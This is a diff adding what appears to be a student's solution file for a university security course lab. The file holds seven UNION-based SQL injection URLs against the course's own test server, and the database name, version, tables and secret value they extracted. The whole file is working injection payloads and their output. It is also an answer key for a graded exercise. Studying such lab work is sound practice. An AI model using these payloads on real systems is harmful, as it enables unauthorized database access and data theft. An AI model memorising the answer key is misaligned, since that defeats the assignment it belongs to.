@@ -1,0 +1,12 @@
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+database(),+@@version+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+null,+table_name+from+information_schema.tables+where+table_schema='proj2_xtra_cr3dit'+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+null,+table_name+from+information_schema.tables+where+table_schema='proj2_xtra_cr3dit'+and+table_name+<>+'SECRETTABLE'+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+null,+table_name+from+information_schema.tables+where+table_schema='proj2_xtra_cr3dit'+and+table_name+<>+'SECRETTABLE'+and+table_name+<>+'foo'+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+count(*),+column_name+from+information_schema.columns+where+table_name='SECRETTABLE'+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+null,+column_name+from+information_schema.columns+where+table_name='SECRETTABLE'+and+column_name+<>+'id'+#
+http://eecs388.org/project2/sqlinject3/?id='+union+all+select+null,+null,+secret+from+SECRETTABLE+#
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.41-0ubuntu0.14.04.1
+Tables: foo,inject3_users,SECRETTABLE
+Secret: hunter2
